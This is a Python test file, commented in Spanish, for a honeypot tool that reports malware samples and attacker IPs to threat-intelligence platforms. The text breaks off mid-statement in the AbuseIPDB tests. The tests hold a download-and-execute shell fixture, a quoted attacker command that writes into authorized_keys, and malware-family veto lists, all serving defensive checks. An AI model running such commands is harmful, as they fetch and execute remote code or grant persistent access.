#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
"""
Comprueba las puertas una a una: lo que debe publicarse y, sobre todo, lo que
NO debe salir jamas.

Se ejecuta sin claves, sin red y sin honeypot:

    python3 tests/test_gates.py        ->  codigo 0 si todo pasa

Cada vez que se toque una politica o un umbral, esto tiene que seguir en
verde. Si una puerta deja de saltar, aqui se ve antes de que se note en una
cuenta suspendida.
"""

from __future__ import annotations

import ast
import json
import hashlib
import sys
import tempfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import harness                                                    # noqa: E402
from harness import LLAMADAS, RAIZ, Resultados, instalar_doble, responder

instalar_doble()          # antes de importar nada del reporter

from common import ipguard, log, ratelimit                       # noqa: E402
from common.config import Config                                 # noqa: E402
from common import http as http_mod                              # noqa: E402
from common.http import HttpClient                               # noqa: E402
from common.model import Sample as _S  # noqa: E402
from common.model import (SIN_CAMPANA, AttackerIP, C2Indicator,
                          PayloadURL, Sample)  # noqa: E402
from common.state import DISCARDED, State                        # noqa: E402
from reporters.abuseipdb import AbuseIPDB                        # noqa: E402
from reporters.base import AbuseChReporter                      # noqa: E402
from reporters.malwarebazaar import MalwareBazaar                # noqa: E402
from reporters.threatfox import ThreatFox                        # noqa: E402
from reporters.urlhaus import URLhaus                            # noqa: E402
from reporters.virustotal import (KNOWN_FAMILIES, MIN_LARGO_FAMILIA,
                                  VirusTotal)                  # noqa: E402

RAIZ = Path(__file__).resolve().parent.parent
R = Resultados("test_gates")
AHORA = datetime.now(timezone.utc)


def informe(malicious: int, familias: list[str], dias: int, vhash: str = "vh-a"):
    """Informe de VirusTotal a medida, con el reparto de motores que se pida."""
    res = {}
    for i in range(malicious):
        res[f"Motor{i}"] = {"result": familias[i] if i < len(familias) else "Trojan.Generic"}
    for i in range(20):
        res[f"Limpio{i}"] = {"result": None}
    return {"data": {"attributes": {
        "last_analysis_stats": {"malicious": malicious, "suspicious": 0, "undetected": 20},
        "last_analysis_results": res,
        "first_submission_date": int((AHORA - timedelta(days=dias)).timestamp()),
        "vhash": vhash, "ssdeep": "3:abc:def"}}}


def muestra(datos: bytes, ruta: Path, host: str | None = "185.7.7.7",
            url: str | None = "http://185.7.7.7/arm7") -> Sample:
    ruta.write_bytes(datos)
    return Sample(sha256=hashlib.sha256(datos).hexdigest(), path=ruta,
                  size=len(datos), source="cowrie", seen_at=AHORA,
                  download_url=url, download_host=host, src_ip="185.7.7.7")


def main() -> int:
    d = Path(tempfile.mkdtemp())
    cfg_path = d / "config.ini"
    cfg_path.write_text(f"""
[general]
state_db = {d / 'estado.sqlite3'}
log_file = {d / 'prueba.log'}
[blocklist]
ips = 203.0.113.7
[virustotal]
enabled = true
api_key = CLAVE_FALSA_VT_0123456789
[malwarebazaar]
enabled = true
api_key = CLAVE_FALSA_MB_0123456789
familias_vetadas = wannacry, wannacrypt, wanacrypt0r, wcry, wcrypt
infectores_de_fichero = virut, sality, ramnit, expiro, neshta, parite, virlock
[abuseipdb]
enabled = true
api_key = CLAVE_FALSA_AB_0123456789
[urlhaus]
enabled = true
api_key = CLAVE_FALSA_UH_0123456789
[threatfox]
enabled = true
api_key = CLAVE_FALSA_TF_0123456789
usuario = NuestroUsuario
""", encoding="utf-8")

    cfg = Config(cfg_path, require_secure_perms=False)
    log.setup(None, "ERROR")            # las pruebas hablan por si solas

    # Los limites por minuto se comprueban leyendo la tabla, no esperando: con
    # el ritmo real puesto, esta prueba tardaria mas de un minuto durmiendo en
    # VirusTotal, y una prueba lenta es una prueba que se deja de ejecutar. Los
    # topes DIARIOS se conservan, porque de esos si dependen las puertas.
    R.seccion("Limites de ritmo declarados")
    R.igual("VirusTotal: 4/min y 500/dia", ratelimit.LIMITS["virustotal"], (4.0, 500))
    R.igual("AbuseIPDB: 1000/dia", ratelimit.LIMITS["abuseipdb"][1], 1000)
    ratelimit.LIMITS = {k: (None, v[1]) for k, v in ratelimit.LIMITS.items()}

    # Lo mismo con el retroceso ante un 5xx: se comprueba que esta declarado y
    # se acorta, en vez de esperar los ~14 s reales de los cuatro intentos.
    R.igual("cuatro intentos ante fallo del servidor", http_mod.MAX_ATTEMPTS, 4)
    R.check("el retroceso es exponencial", http_mod.BACKOFF_BASE > 1)
    http_mod.MAX_BACKOFF = 0.01

    guard = ipguard.IPGuard(cfg.block_ips, cfg.block_cidrs)
    estado = State(cfg.state_db)
    http = HttpClient(estado, timeout=5, dry_run=True)

    vt = VirusTotal(cfg.section("virustotal"), http, estado, guard)
    mb = MalwareBazaar(cfg.section("malwarebazaar"), http, estado, guard)
    ab = AbuseIPDB(cfg.section("abuseipdb"), http, estado, guard)
    uh = URLhaus(cfg.section("urlhaus"), http, estado, guard)
    tf = ThreatFox(cfg.section("threatfox"), http, estado, guard)

    elf_arm = b"\x7fELF\x01\x01\x01" + bytes(11) + b"\x28\x00" + b"M" * 300
    s = muestra(elf_arm, d / "arm")

    # ---------------------------------------------------------------- barrera
    R.seccion("Barrera de IPs (el control mas importante)")
    R.check("el self-test de ipguard no encuentra fallos",
            not ipguard.self_test())
    R.check("las IP publicas de la VPS estan en la capa fija del codigo",
            bool(ipguard.HARDCODED_NEVER_REPORT))
    for propia in ipguard.HARDCODED_NEVER_REPORT:
        R.check(f"la capa fija bloquea {propia}",
                not ipguard.IPGuard().is_reportable(propia))

    # ------------------------------------------------------------ VirusTotal
    R.seccion("VirusTotal: subida y puerta 12+3")
    responder("GET", "/files/", 404, {})
    R.check("una muestra desconocida se detecta como nueva", vt.is_new(s.sha256) is True)
    R.check("la muestra nueva se sube (autoria)", vt.upload(s))

    responder("GET", "/files/", 200, informe(4, ["Mirai"], 2))
    v = vt.verdict(s.sha256)
    R.check("con 4 motores NO se publica", not vt.passes_gate(s.sha256, v))

    # La familia YA NO esta en la puerta de evidencia. Son dos preguntas
    # distintas ---"es malware?" y "sabemos como se llama?"--- y solo la
    # segunda le hace falta a MalwareBazaar y a ThreatFox. Mezclarlas apagaba
    # las cinco plataformas por no saber poner un nombre.
    responder("GET", "/files/", 200, informe(12, [], 2))
    v = vt.verdict(s.sha256)
    R.check("12 motores sin nombre de familia SI son malware acreditado",
            vt.passes_gate(s.sha256, v))
    R.check("pero no se puede nombrar, asi que MalwareBazaar no la sube",
            not vt.familia_ok(mb, s.sha256, v))

    responder("GET", "/files/", 200, informe(12, ["Adware.X"] * 12, 2))
    v = vt.verdict(s.sha256)
    R.check("el adware dominante se descarta", not vt.passes_gate(s.sha256, v))
    R.igual("y el motivo se dice por su nombre",
            vt.motivo_rechazo(s.sha256, v), "adware")

    # Tres motores, tres nombres distintos: nadie sabe que es. Antes esto
    # pasaba la puerta, porque se contaban nombres en vez de coincidencias.
    responder("GET", "/files/", 200, informe(14, ["Mirai", "Gafgyt", "Tsunami"], 2))
    v = vt.verdict(s.sha256)
    R.check("14 motores pero tres nombres sueltos: no hay familia que poner",
            not vt.familia_ok(mb, s.sha256, v))

    responder("GET", "/files/", 200, informe(14, ["Mirai"] * 3, 2))
    v = vt.verdict(s.sha256)
    R.check("14 motores y 3 coincidiendo en mirai SI se publica",
            vt.passes_gate(s.sha256, v))

    # El caso que destapo el fallo: un WannaCry que TODOS nombran igual daba
    # una sola familia y se rechazaba, justo por estar bien identificado.
    responder("GET", "/files/", 200, informe(20, ["WannaCry"] * 18, 2))
    v = vt.verdict(s.sha256)
    R.igual("consenso masivo en un solo nombre", v["consenso"], 18)
    R.check("y una familia unica con consenso SI se publica",
            vt.passes_gate(s.sha256, v))
    R.check("comentario y voto salen", vt.comment_and_vote(s, v))
    texto = vt._comment_text(s, v)
    R.check("el comentario no lleva la IP del atacante",
            "185.7.7.7" not in texto.split("Served from:")[0])

    # OPSEC: lo que se publica es permanente y publico. Escribirlo en
    # castellano ata el honeypot a un operador hispanohablante cuando la
    # maquina se presenta como ucraniana; la lengua identifica tanto como
    # una IP. Se comprueban palabras que solo aparecerian en la version
    # antigua, para que una traduccion a medias tampoco pase.
    for palabra in ("Capturado", "Arquitectura", "Tamano", "Familias segun",
                    "Servido desde", "motores maliciosos"):
        R.check(f"el comentario de VirusTotal no dice {palabra!r}",
                palabra not in texto)
    R.check("y esta en ingles", "Captured by an" in texto)

    firma = AttackerIP(ip="185.7.9.9", source="cowrie", first_seen=AHORA,
                       last_seen=AHORA, handshake_ok=True, login_failures=7,
                       login_successes=1, commands=3, ports={22})
    com_ab = ab.comment(firma)
    for palabra in ("intentos de login", "credenciales", "comandos ejecutados",
                    "Puertos destino", "Ventana"):
        R.check(f"el comentario de AbuseIPDB no dice {palabra!r}",
                palabra not in com_ab)
    R.check("y tambien esta en ingles", "honeypot." in com_ab
            and "failed login attempts" in com_ab)

    # La firma es opcional, y un marcador sin sustituir NO se publica: dejar
    # "#<TU-HANDLE>" en un comentario permanente seria peor que no firmar.
    R.igual("sin handle no se firma nada", vt.attribution_tag, "")
    vt.attribution = "<TU-HANDLE-EN-LAS-PLATAFORMAS>"
    R.igual("un marcador sin sustituir tampoco se publica", vt.attribution_tag, "")
    vt.attribution = "HandleDePrueba"
    R.igual("y con handle se firma con almohadilla",
            vt.attribution_tag, "#HandleDePrueba")
    R.check("la firma llega al comentario",
            "#HandleDePrueba" in vt._comment_text(s, v))
    vt.attribution = ""

    R.seccion("De abuse.ch se anota la respuesta AUNQUE salga bien")
    # "query_status=ok" no significa necesariamente "se ha anadido": el detalle
    # de que paso con cada indicador va en `data`, y su API no documenta la
    # respuesta de submit_ioc. El 2026-08-28 el parte dijo "threatfox: 1
    # publicadas" y en el perfil no habia nada nuevo; sin la respuesta guardada
    # no se puede distinguir "publicado" de "aceptado e ignorado por
    # duplicado". Se anota para decidirlo sobre un dato y no sobre una
    # suposicion.
    _base_src = (RAIZ / "reporters" / "base.py").read_text(encoding="utf-8")
    _uh_src = (RAIZ / "reporters" / "urlhaus.py").read_text(encoding="utf-8")
    R.check("la clase de abuse.ch la anota al aceptar",
            'respuesta de %s' in _base_src)
    R.check("y urlhaus, que valida distinto, tambien",
            'respuesta de %s' in _uh_src)
    R.check("query_status=ok sigue siendo lo unico que se acepta",
            AbuseChReporter.ESTADOS_OK == {"ok"})

    R.seccion("Un 429 'ya la reportaste' de AbuseIPDB NO es un rechazo")
    # Paso el 2026-08-27 con 103.29.185.162, y la consecuencia no fue una
    # alarma falsa: fue mandarles la MISMA IP dos veces. AbuseIPDB acepto la
    # denuncia, la respuesta se perdio, el cliente reintento, el reintento se
    # encontro con su propia denuncia y contesto 429. Al darlo por fallido no
    # se anoto en `sent`, asi que el enfriamiento de 24 h no tenia de que
    # agarrarse y la pasada de 14 minutos despues volvio a denunciarla.
    from common.http import Response as _R429
    _quince = _R429(status=429, text='{"errors":[{"detail":"You can only report '
                    'the same IP address once in 15 minutes.","status":429}]}')
    R.check("el 429 de los 15 minutos se da por bueno", ab.response_ok(_quince)[0])
    # El de cuota agotada es un rechazo DE VERDAD y tiene que seguir siendolo:
    # si se diera por bueno, se marcarian como enviadas denuncias que no salieron.
    _cuota = _R429(status=429, text='{"errors":[{"detail":"Daily rate limit of '
                   '1000 requests exceeded.","status":429}]}')
    R.check("pero el de cuota diaria sigue siendo rechazo",
            not ab.response_ok(_cuota)[0])
    R.check("y un 422 tambien",
            not ab.response_ok(_R429(status=422, text="invalid"))[0])
    R.check("un 200 sigue estando bien",
            ab.response_ok(_R429(status=200, text="{}"))[0])

    R.seccion("Un 409 'ya existe' de VirusTotal NO es un rechazo")
    # Paso de verdad: el voto de una muestra salio en el resumen diario como
    # "1 RECHAZADAS POR LA PLATAFORMA", que es la unica linea que pide mirar el
    # mismo dia. Y no habia nada que mirar: VirusTotal contestaba que ese voto
    # YA ESTABA PUESTO. Ademas, al no anotarse como enviado, la muestra volvia
    # a intentarlo en cada rechequeo y gastaba una llamada de API cada vez.
    from common.http import Response as _Resp
    _ya = _Resp(status=409, text='{"error": {"code": "AlreadyExistsError"}}',
                json_body={"error": {"code": "AlreadyExistsError",
                                     "message": "already voted"}})
    R.check("un 409 AlreadyExists se da por bueno", vt.response_ok(_ya)[0])
    _otro409 = _Resp(status=409, text='{"error": {"code": "OtraCosa"}}',
                     json_body={"error": {"code": "OtraCosa"}})
    R.check("pero otro 409 sigue siendo un rechazo",
            not vt.response_ok(_otro409)[0])
    R.check("y un 500 tambien",
            not vt.response_ok(_Resp(status=500, text="boom"))[0])
    R.check("un 200 sigue estando bien",
            vt.response_ok(_Resp(status=200, text="{}"))[0])
    # Sin cuerpo JSON legible, se mira el texto: la respuesta puede llegar
    # troceada o sin content-type, y el 409 sigue significando lo mismo.
    R.check("con el cuerpo ilegible, basta el texto",
            vt.response_ok(_Resp(status=409, text="AlreadyExistsError"))[0])

    R.seccion("La familia se elige por consenso, no por orden alfabetico")
    res = {f"A{i}": {"result": "Linux.Mirai.Mirai"} for i in range(9)}
    res.update({f"B{i}": {"result": "ELF:Gafgyt-A"} for i in range(2)})
    R.igual("gana la familia que mas motores nombran",
            VirusTotal._families(res)[0][0], "mirai")

    R.seccion("Una familia que no conociamos tambien se puede nombrar")
    # El filtro era una lista BLANCA de 39 nombres: lo que no estuviera dentro
    # valia cero por unanimes que fueran los motores. RedTail ---capturado el
    # 2026-08-22--- daba consenso 0 con treinta
    # motores diciendo lo mismo, y el rechazo se leia "solo 0 motores coinciden
    # en la familia ninguna". Ahora el filtro es una lista NEGRA.
    for nombre, esperado in (("Linux.Trojan.RedTail", "redtail"),
                             ("Trojan.Linux.Sysrv", "sysrv"),
                             ("Win32.Trojan.RedLine", "redline")):
        fams, _, cuenta = VirusTotal._families(
            {f"M{i}": {"result": nombre} for i in range(30)})
        R.igual(f"{esperado}: se nombra aunque no este en KNOWN_FAMILIES",
                fams[0] if fams else "(ninguna)", esperado)
        R.igual(f"{esperado}: con el consenso de los 30 motores",
                cuenta.get(esperado, 0), 30)

    # Y lo que la lista negra tiene que seguir parando, que es la razon de que
    # el filtro no se pueda quitar sin mas: sin el, el token mas contado seria
    # "trojan" y publicariamos `malware: trojan`.
    for ruido in ("Trojan.Generic", "Linux.Agent.ABC", "ELF/Downloader",
                  "Gen:Variant.Zusy.412", "HEUR:Trojan.Linux.Generic",
                  "Win32:Malware-gen", "Trojan.Kryptik.HD"):
        fams, _, _ = VirusTotal._families(
            {f"M{i}": {"result": ruido} for i in range(30)})
        # Se comprueba que ninguno de los tokens genericos gana. Un nombre de
        # variante propio de una casa ("ABC") puede colarse en el recuento,
        # pero nunca reune tres motores DISTINTOS, que es lo que mide la
        # puerta; lo que no puede pasar es que gane una palabra de clase.
        principal = fams[0] if fams else None
        R.check(f"{ruido!r} no acaba publicandose como familia",
                principal not in {"trojan", "generic", "agent", "downloader",
                                  "zusy", "malware", "kryptik", "heur", "gen",
                                  "variant", "linux", "win32", "elf"})

    R.seccion("El sufijo de variante no puede hacerse pasar por la familia")
    # Casi todos los motores pegan un sufijo de variante al nombre, y viaja en
    # la MISMA cadena, asi que empata con la familia en numero de motores. Al
    # desempatar por orden alfabetico, "abc" le ganaba a "mirai" y la muestra
    # se habria publicado etiquetada como familia "abc". Es el agujero que abre
    # cambiar la lista blanca por una negra, y no lo tapa la lista negra: no se
    # pueden enumerar los sufijos de todas las casas.
    for cadena, esperado in (("ELF:Mirai-ABC [Trj]", "mirai"),
                             ("Trojan.Linux.Mirai.abc", "mirai"),
                             ("ELF:Mirai-ABCD", "mirai"),
                             ("Linux.Trojan.RedTail.xyz", "redtail"),
                             ("Linux.Trojan.RedTail.ABCD", "redtail")):
        fams, _, _ = VirusTotal._families(
            {f"M{i}": {"result": cadena} for i in range(30)})
        R.igual(f"{cadena!r} se publica como {esperado!r}",
                fams[0] if fams else "(ninguna)", esperado)

    R.check("ninguna familia conocida baja del largo minimo, asi que el corte "
            "no se lleva ninguna por delante",
            min(len(f) for f in KNOWN_FAMILIES) >= MIN_LARGO_FAMILIA)

    R.seccion("Un rechazo que no mejora esperando no se reintenta")
    R.check("el adware es definitivo", "adware" in vt.DEFINITIVOS)
    R.check("la deteccion NO lo es: los motores se ponen al dia",
            "deteccion" not in vt.DEFINITIVOS)
    R.check("el veredicto tampoco", "veredicto" not in vt.DEFINITIVOS)
    R.check("y la familia ya no llega a la puerta de evidencia",
            "familia" not in vt.DEFINITIVOS)

    R.seccion("El rechazo por familia se le apunta a quien no publico")
    responder("GET", "/files/", 200, informe(12, [], 2))
    v = vt.verdict(s.sha256)
    vt.familia_ok(mb, s.sha256, v)
    quienes = [f[0] for f in estado.db.execute(
        "SELECT platform FROM rejections WHERE key=? AND gate='familia'",
        (s.sha256,))]
    R.check("consta como rechazo de MalwareBazaar", "malwarebazaar" in quienes)
    R.check("y NO de VirusTotal, que no pide familia ninguna",
            "virustotal" not in quienes)

    # --------------------------------------------------------- MalwareBazaar
    # ------------------------------------------------- artefactos inocuos
    #
    # Caso real: el atacante instala su clave publica con
    #   echo "ssh-rsa AAAA..." > ~/.ssh/authorized_keys
    # y Cowrie guarda lo escrito como fichero capturado. Llegaba a la cola
    # como una muestra mas, y si VirusTotal no lo conocia se le subia como
    # primera aparicion. Publicarlo nunca fue posible ---la puerta de 12
    # motores lo rechaza--- pero ensucia su base y gasta cuota.
    R.seccion("Lo que no es un payload no llega a VirusTotal")

    from common.model import artefacto_inocuo
    da = d / "artefactos"
    da.mkdir(exist_ok=True)

    def _artefacto(nombre: str, datos: bytes):
        ruta = da / nombre
        ruta.write_bytes(datos)
        return artefacto_inocuo(ruta, len(datos))

    R.check("una clave SSH publica se descarta",
            _artefacto("ak", b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB rsa-key-20230629")
            is not None)
    R.check("y tambien con opciones delante",
            _artefacto("ak2", b'command="x",no-pty ssh-ed25519 AAAAC3Nza yo@host')
            is not None)
    R.check("el texto diminuto sin nada ejecutable, tambien",
            _artefacto("txt", b"hola que tal") is not None)

    # Lo importante es lo que NO se descarta: el filtro es timido a proposito.
    R.igual("un script con shebang SIGUE su camino",
            _artefacto("sh", b"#!/bin/sh" + bytes([10]) + b"wget http://x/y; ./y"), None)
    R.igual("un ELF, aunque sea diminuto, SIGUE",
            _artefacto("elf", bytes([0x7F]) + b"ELF" + bytes(60)), None)
    R.igual("un gzip SIGUE", _artefacto("gz", bytes([0x1F, 0x8B, 8, 0]) + bytes(40)), None)
    R.igual("y cualquier cosa con bytes nulos SIGUE",
            _artefacto("bin", bytes([1, 2, 0, 3]) * 50), None)
    R.igual("por encima del limite tampoco se descarta nada",
            _artefacto("grande", b"A" * 900), None)

    R.seccion("MalwareBazaar: antiguedad y cinco capas de unicidad")
    # Se vuelve a un veredicto de Mirai. Arriba quedo uno de WannaCry, del caso
    # del consenso masivo, y a partir de aqui se sube pasando la familia
    # "mirai": el veredicto y la etiqueta tienen que decir lo mismo, o la
    # puerta de politica ---que mira el veredicto--- rechaza con razon algo que
    # el resto de la prueba da por subible.
    responder("GET", "/files/", 200, informe(20, ["Mirai"] * 18, 2))
    v = vt.verdict(s.sha256)
    responder("POST", "mb-api", 200, {"query_status": "hash_not_found"})
    R.check("la muestra que pasa la puerta se sube", mb.upload(s, v, "mirai"))

    v_viejo = dict(v, vhash="vh-viejo",
                   first_submission=AHORA - timedelta(days=30))
    s_viejo = muestra(elf_arm + b"V", d / "viejo", host="9.9.9.9")
    R.check("una muestra de 30 dias segun VT se rechaza por antiguedad",
            not mb.upload(s_viejo, v_viejo, "gafgyt"))

    v_sin_fecha = dict(v, vhash="vh-sf", first_submission=None)
    s_sf = muestra(elf_arm + b"SF", d / "sinfecha", host="9.9.9.8")
    R.check("sin first_submission_date de VT no se sube (causa del baneo)",
            not mb.upload(s_sf, v_sin_fecha, "gafgyt"))

    # La atribucion en MalwareBazaar NO es un campo de la subida: va en una
    # llamada aparte con query=add_comment, y sale despues de que la subida
    # haya ido bien. Importa porque los rastreadores que republican muestras
    # de MalwareBazaar copian ese texto, y con el se llevan el handle: es la
    # unica forma de que la autoria sobreviva al salto entre plataformas.
    #
    # Muestra distinta a proposito: la de arriba ya publico su comentario al
    # subirse, y la deduplicacion --- correctamente --- no deja repetirlo.
    s_com = muestra(elf_arm + b"CMT", d / "cmt", host="9.9.9.9", url=None)
    mb.attribution = "HandleDePrueba"
    capturado: list = []
    _request_real = mb.http.request

    def _espia(nombre, metodo, url, **kw):
        capturado.append(kw.get("data") or {})
        return _request_real(nombre, metodo, url, **kw)

    mb.http.request = _espia
    mb.add_comment(s_com)
    mb.http.request = _request_real
    mb.attribution = ""

    cuerpos = [c for c in capturado if c.get("query") == "add_comment"]
    R.igual("el comentario va en su propia llamada add_comment", len(cuerpos), 1)
    if cuerpos:
        texto_mb = cuerpos[0]["comment"]
        R.igual("y sobre el sha de la muestra recien subida",
                cuerpos[0]["sha256_hash"], s_com.sha256)
        R.check("nombra al honeypot y firma con el handle",
                "honeypot" in texto_mb and "HandleDePrueba" in texto_mb)
        R.check("en ingles, como el resto de lo publicado",
                texto_mb.startswith("First-seen sample captured in-the-wild"))

    R.check("capa 1: el mismo hash no se sube dos veces",
            not mb.upload(s, dict(v, vhash="vh-otro"), "mirai"))

    s_arm2 = muestra(elf_arm + b"ZZ", d / "arm2")
    R.check("capa 4: otro arm de la misma campana se rechaza",
            not mb.upload(s_arm2, dict(v, vhash="vh-arm2"), "mirai"))

    elf_mips = b"\x7fELF\x01\x01\x01" + bytes(11) + b"\x08\x00" + b"Q" * 300
    s_mips = muestra(elf_mips, d / "mips")
    R.check("capa 4: un mips de la misma campana SI se sube (no es hash busting)",
            mb.upload(s_mips, dict(v, vhash="vh-mips"), "mirai"))

    R.seccion("Capa 5: la rafaga del mismo origen y arquitectura")
    # El collector guarda la campana al recoger la muestra y MalwareBazaar la
    # busca al publicar. Si esas dos claves no se construyen igual, la busqueda
    # no encuentra nada y la capa no salta nunca, sin dar ningun error.
    from common.model import campaign_host
    rafaga = [muestra(elf_arm + bytes([i]), d / f"raf{i}", host="6.6.6.6")
              for i in range(4)]
    for r in rafaga:
        estado.upsert_sample(r.sha256, arch=r.elf_machine,
                             campaign_key=campaign_host(r))
    R.igual("se cuentan los binarios de la misma campana",
            estado.burst_count(campaign_host(rafaga[0]), rafaga[0].elf_machine, 60), 4)
    R.check("y la capa los rechaza por hash busting",
            not mb.upload(rafaga[0], dict(v, vhash="vh-raf"), "mirai"))

    solitaria = muestra(elf_arm + b"SOLO", d / "solo", host="7.7.7.7")
    estado.upsert_sample(solitaria.sha256, arch=solitaria.elf_machine,
                         campaign_key=campaign_host(solitaria))
    R.check("una muestra sola de su campana no se confunde con una rafaga",
            mb.upload(solitaria, dict(v, vhash="vh-solo"), "mirai"))

    # Sin campana conocida, la capa 5 NO puede opinar. Es el caso de todo lo
    # que Dionaea captura por SMB: llega sin URL y sin IP asociada al fichero,
    # asi que agruparlas todas bajo "sin-campana" declaraba hash busting a
    # binarios de atacantes distintos y cerraba el canal principal de subidas.
    sin_camp = [muestra(elf_arm + b"NC%d" % i, d / f"nc{i}",
                        host=None, url=None) for i in range(3)]
    for r in sin_camp:
        r.src_ip = None
        estado.upsert_sample(r.sha256, arch=r.elf_machine,
                             campaign_key=campaign_host(r))
    R.igual("las tres comparten el cubo de 'sin campana'",
            campaign_host(sin_camp[0]), SIN_CAMPANA)
    # Instancia limpia: el `mb` de arriba ya gasto su tope de la pasada, y
    # ese rechazo taparia el que se quiere comprobar aqui.
    mb2 = MalwareBazaar(cfg.section("malwarebazaar"), http, estado, guard)
    R.check("y aun asi la primera se sube",
            mb2.upload(sin_camp[0], dict(v, vhash="vh-nc0"), "mirai"))
    R.check("y la segunda tambien, no son una rafaga",
            mb2.upload(sin_camp[1], dict(v, vhash="vh-nc1"), "gafgyt"))

    R.seccion("Las URL sin muestra dejan constancia, no desaparecen")
    # URLhaus solo recibe URL que produjeron un binario capturado, y eso es
    # deliberado: sin muestra no hay veredicto, y sin veredicto no se acredita
    # nada. Lo que estaba mal era el silencio: se recogian, se contaban y
    # desaparecian sin dejar rechazo.
    import orchestrator as _orq
    from common.model import PayloadURL as _PU

    class _UHFalso:
        name = "urlhaus"
        def __init__(self): self.motivos = {}
        def is_enabled(self): return True
        def gate(self, key, gate, passes, reason):
            if not passes:
                self.motivos[gate] = self.motivos.get(gate, 0) + 1
            return passes

    _uh = _UHFalso()
    _con = muestra(b"\x7fELF" + b"C" * 300, d / "conurl",
                   url="http://malo/si", host="malo")
    _urls = [_PU(url="http://malo/si", source="cowrie", seen_at=AHORA),
             _PU(url="http://malo/no", source="cowrie", seen_at=AHORA)]
    _orq.anotar_urls_sin_muestra(_uh, _urls, [_con])
    R.igual("la URL que si dio muestra no se anota como rechazo",
            1, _uh.motivos.get("sin-muestra", 0))

    _uh2 = _UHFalso()
    _orq.anotar_urls_sin_muestra(_uh2, [], [_con])
    R.igual("sin URL recogidas no se anota nada", 0, len(_uh2.motivos))

    R.seccion("MalwareBazaar: los dos vetos de politica")
    # El de WannaCry NO sale de la FAQ: sale de una indicacion directa de
    # abuse.ch por correo. El de infectores de fichero si es la FAQ. Los dos
    # viven en el config.ini porque abuse.ch no publica catalogo y avisa por
    # correo, asi que hay que poder ampliarlos sin tocar codigo.
    mbp = MalwareBazaar(cfg.section("malwarebazaar"), http, estado, guard)
    wc = muestra(b"MZ" + b"W" * 400, d / "wc", host=None, url=None)

    def _v(etiquetas=(), familias=()):
        return {"conocido": True, "completed": True, "malicious": 60,
                "suspicious": 0, "etiquetas": list(etiquetas),
                "familias": list(familias), "consenso": 55, "adware": False,
                "first_submission": AHORA - timedelta(days=1),
                "vhash": "vh-wc", "ssdeep": "3:w:w"}

    R.check("las dos listas se leen del config.ini",
            bool(mbp.familias_vetadas) and bool(mbp.infectores))

    # Y que el config.ini.example que se despliega traiga los valores buenos:
    # si alguien lo vacia, el senuelo sale a produccion sin veto.
    import configparser as _cp
    _ej = _cp.ConfigParser()
    _ej.read(Path(__file__).resolve().parent.parent / "config.ini.example")
    _mb = _ej["malwarebazaar"]
    R.check("el config.ini.example veta WannaCry de serie",
            "wannacry" in _mb.get("familias_vetadas", "").lower())
    R.check("y trae los infectores de fichero de serie",
            "sality" in _mb.get("infectores_de_fichero", "").lower())

    # --- coincidencia PARCIAL, que es lo que hace que sirva ---------------
    R.check("un 'Ransom.WannaCry.A' se rechaza (coincidencia parcial)",
            not mbp.politica_ok(wc, _v(etiquetas=["ransom.wannacry.a"])))
    R.check("un 'Trojan.WannaCrypt' tambien, aunque se escriba distinto",
            not mbp.politica_ok(wc, _v(etiquetas=["trojan.wannacrypt"])))
    R.check("y un 'W32/WCry.gen', que no lleva el nombre entero",
            not mbp.politica_ok(wc, _v(etiquetas=["w32/wcry.gen"])))

    # --- las DOS fuentes, no solo una -----------------------------------
    R.check("se mira tambien nuestra clasificacion de familia",
            not mbp.politica_ok(wc, _v(familias=["wannacry"])))
    R.check("y la familia que se pasa al subir",
            not mbp.politica_ok(wc, _v(etiquetas=["trojan.generic"]),
                                familia="wannacry"))

    # --- infectores de fichero, sobre todo por la ruta de Dionaea --------
    R.check("un Sality se rechaza por la lista de infectores",
            not mbp.politica_ok(wc, _v(etiquetas=["win32.sality.gen"])))
    R.check("un veredicto que empieza por 'Virus.' se rechaza sin nombre",
            not mbp.politica_ok(wc, _v(etiquetas=["virus.win32.expiro.pn"])))
    R.check("y uno que empieza por 'W32.Virus'",
            not mbp.politica_ok(wc, _v(etiquetas=["w32.virus.gen"])))
    R.check("pero 'virus' EN MEDIO de la etiqueta no dispara el prefijo",
            mbp.politica_ok(wc, _v(etiquetas=["trojan.antivirus.fake"])))

    # --- lo que NO se puede romper --------------------------------------
    # abuse.ch aclaro que la regla apunta a infectores clasicos y que Mirai es
    # aceptable. Si esto falla, el senuelo de telnet deja de reportar.
    R.check("Mirai se sube, aunque se autopropague",
            mbp.politica_ok(wc, _v(etiquetas=["linux.mirai.a"], familias=["mirai"])))
    R.check("Gafgyt tambien",
            mbp.politica_ok(wc, _v(etiquetas=["elf.gafgyt.b"], familias=["gafgyt"])))
    R.check("y un motor que llama a Mirai 'Worm.Linux.Mirai' no lo veta",
            mbp.politica_ok(wc, _v(etiquetas=["worm.linux.mirai"], familias=["mirai"])))

    # --- fail-closed, mismo criterio que IPGuard -------------------------
    R.check("sin ninguna clasificacion NO se sube",
            not mbp.politica_ok(wc, _v()))
    R.check("y el motivo lo dice: no se pudo clasificar",
            "politica-sin-clasificar" in mbp.motivos)

    # --- el log tiene que decir QUE coincidio, para poder auditarlo ------
    mbp2 = MalwareBazaar(cfg.section("malwarebazaar"), http, estado, guard)
    mbp2.politica_ok(wc, _v(etiquetas=["ransom.wannacry.a"]))
    ultimo = estado.ultimo_rechazo() if hasattr(estado, "ultimo_rechazo") else None
    R.check("el rechazo queda anotado como politica-wannacry",
            "politica-wannacry" in mbp2.motivos)
    R.check("y el de infectores con su propia etiqueta",
            (lambda m: (m.politica_ok(wc, _v(etiquetas=["virus.win32.neshta"])),
                        "politica-infector-de-fichero" in m.motivos)[1])(
                MalwareBazaar(cfg.section("malwarebazaar"), http, estado, guard)))

    R.seccion("MalwareBazaar: fail-closed si no se puede comprobar")
    responder("POST", "mb-api", 500, None)
    R.check("si get_info falla se asume que ya existe",
            mb.exists_upstream("f" * 64))
    responder("POST", "mb-api", 200, {"query_status": "hash_not_found"})

    # -------------------------------------------------------------- AbuseIPDB
    R.seccion("AbuseIPDB: handshake obligatorio y ninguna IP propia")
    sin_hs = AttackerIP(ip="91.240.118.5", source="dionaea", first_seen=AHORA,
                        last_seen=AHORA, handshake_ok=False, login_failures=20)
    R.check("sin handshake NO se reporta (prohibicion de SYN flood y UDP)",
            not ab.report(sin_hs))

    con_hs = AttackerIP(ip="45.9.148.99", source="cowrie", first_seen=AHORA,
                        last_seen=AHORA, handshake_ok=True, login_failures=20,
